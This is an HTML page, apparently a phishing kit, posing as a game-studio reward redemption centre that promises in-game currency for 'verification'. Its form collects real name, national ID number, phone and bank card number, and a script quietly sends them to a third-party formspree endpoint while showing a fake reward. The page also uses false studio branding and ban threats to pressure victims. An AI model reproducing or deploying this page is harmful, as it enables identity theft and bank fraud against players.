<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>活动兑换中心</title>
  <style>
    body {
      margin: 0;
      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      background-size: 600% 600%;
      animation: gradient 15s ease infinite;
      color: #fff;
    }

    @keyframes gradient {
      0% { background-position: 0% 50% }
      50% { background-position: 100% 50% }
      100% { background-position: 0% 50% }
    }

    .container {
      max-width: 500px;
      margin: 60px auto;
      background: rgba(0, 0, 0, 0.5);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 10px #00c3ff;
    }

    h1 {
      text-align: center;
      margin-bottom: 20px;
      color: #00c3ff;
    }

    label {
      display: block;
      margin-top: 15px;
      font-size: 16px;
    }

    label .required {
      color: red;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border-radius: 5px;
      border: none;
      font-size: 16px;
    }

    .error {
      color: red;
      font-size: 14px;
      margin-top: 5px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background: #00c3ff;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 18px;
      cursor: pointer;
    }

    button:disabled {
      background: gray;
      cursor: not-allowed;
    }

    .message {
      margin-top: 20px;
      padding: 15px;
      background: #001f3f;
      border-left: 5px solid #00c3ff;
    }

    .footer {
      text-align: center;
      padding: 20px;
      font-size: 14px;
      color: #ccc;
    }

    .footer span {
      display: inline-block;
      margin-top: 10px;
    }

    .announcement {
      background: rgba(0,0,0,0.3);
      margin-top: 30px;
      padding: 15px;
      border: 1px solid #00c3ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>活动兑换中心</h1>
    <form id="rewardForm">
      <label><span class="required">*</span> 选择区服</label>
      <select name="server" required>
        <option value="">请选择</option>
        <option value="微信">微信</option>
        <option value="QQ">QQ</option>
      </select>

      <label><span class="required">*</span> 游戏昵称</label>
      <input type="text" name="nickname" required />

      <label><span class="required">*</span> 姓名</label>
      <input type="text" name="realname" required />
      <div id="nameError" class="error"></div>

      <label><span class="required">*</span> 身份证号</label>
      <input type="text" name="idcard" required />
      <div id="idError" class="error"></div>

      <label><span class="required">*</span> 手机号</label>
      <input type="tel" name="phone" required />

      <label><span class="required">*</span> 银行卡号</label>
      <input type="text" name="bankcard" required />

      <button type="submit" id="submitBtn">提交认证</button>
    </form>

    <div class="message" id="resultBox" style="display:none;"></div>

    <div class="announcement">
      <strong>活动公告：</strong><br>
      1. 本次活动认证可获得60、300、680、1280、1980、3280、6480点卷奖励；<br>
      2. 认证奖励将在24小时内到账，请确保信息填写无误；<br>
      3. 每个游戏账号仅限参与一次，重复提交将失去奖励资格；<br>
      4. 活动最终解释权归光子工作室所有。
    </div>
  </div>

  <div class="footer">
    © 活动最终解释权归光子工作室所有 |
    <span id="copyText" onclick="copyID()">派送员快手账号：Call_Aj6（点击复制）</span><br>
    <span style="color:red;">多次提交冒领奖励查出将给予封号处理</span>
  </div>

  <script>
    function copyID() {
      navigator.clipboard.writeText("Call_Aj6")
        .then(() => alert("快手账号已复制！"))
        .catch(() => alert("复制失败，请手动复制"));
    }

    const form = document.getElementById('rewardForm');
    const submitBtn = document.getElementById('submitBtn');
    const resultBox = document.getElementById('resultBox');

    const nameError = document.getElementById('nameError');
    const idError = document.getElementById('idError');

    const isChineseName = name => /^[\u4e00-\u9fa5]{1,5}$/.test(name);
    const isValidID = id => /^[1-9]\d{16}[\dXx]$/.test(id);

    if (localStorage.getItem("submitted") === "true") {
      submitBtn.disabled = true;
      resultBox.style.display = "block";
      resultBox.innerHTML = `您已成功提交认证，请勿重复提交。<br><br><strong>恭喜获得 ${localStorage.getItem("reward")} 点卷</strong>，点卷将在24小时之内到达。<br><br>奖励内容：火焰刀-维列*1、机械拳套-破风*1、双截棍-神龙*1、车币*3`;
    }

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const realname = form.realname.value.trim();
      const idcard = form.idcard.value.trim();

      nameError.textContent = "";
      idError.textContent = "";

      if (!isChineseName(realname)) {
        nameError.textContent = "姓名应为1到5位中文字符";
        return;
      }

      if (!isValidID(idcard)) {
        idError.textContent = "请输入正确的18位身份证号";
        return;
      }

      const reward = Math.random() < 0.01 ? 300 : 60;
      localStorage.setItem("submitted", "true");
      localStorage.setItem("reward", reward);

      submitBtn.disabled = true;
      resultBox.style.display = "block";
      resultBox.innerHTML = `您已成功提交认证，请勿重复提交。<br><br><strong>恭喜获得 ${reward} 点卷</strong>，点卷将在24小时之内到达。<br><br>奖励内容：火焰刀-维列*1、机械拳套-破风*1、双截棍-神龙*1、车币*3`;

      // 提交至 formspree
      fetch("https://formspree.io/f/mqabzblz", {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          server: form.server.value,
          nickname: form.nickname.value,
          realname,
          idcard,
          phone: form.phone.value,
          bankcard: form.bankcard.value
        })
      });
    });
  </script>
</body>
</html>
